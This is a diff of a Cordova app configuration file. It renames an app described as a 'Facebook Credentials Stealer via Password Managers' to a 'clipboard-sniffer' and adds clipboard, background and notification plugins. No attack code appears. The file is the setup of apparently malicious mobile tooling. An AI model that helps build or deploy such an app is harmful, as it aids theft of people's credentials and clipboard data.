@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='utf-8'?>
-<widget id="com.facebook.vuln" version="0.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+<widget id="com.tsh-clipboard-sniffer.app" version="0.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
     <feature name="Device">
         <param name="android-package" value="org.apache.cordova.device.Device" />
     </feature>
@@ -31,8 +31,14 @@
     <feature name="BackgroundMode">
         <param name="android-package" value="de.appplant.cordova.plugin.background.BackgroundMode" />
     </feature>
-    <name>Facebook</name>
-    <description>Facebook Credentials Stealer via Password Managers.</description>
+    <feature name="Clipboard">
+        <param name="android-package" value="com.niconaso.cordova.clipboard.Clipboard" />
+    </feature>
+    <feature name="LocalNotification">
+        <param name="android-package" value="de.appplant.cordova.plugin.localnotification.LocalNotification" />
+    </feature>
+    <name>tsh-clipboard-sniffer</name>
+    <description>tsh-clipboard-sniffer.</description>
     <author email="" href="https://www.github.com/team-shell.com/">team-shell</author>
     <content src="index.html" />
     <access origin="*" />
@@ -75,7 +81,4 @@
     <preference name="SplashShowOnlyFirstTime" value="false" />
     <preference name="SplashScreen" value="screen" />
     <preference name="SplashScreenDelay" value="3000" />
-    <feature name="Clipboard">
-        <param name="android-package" value="com.niconaso.cordova.clipboard.Clipboard" />
-    </feature>
 </widget>
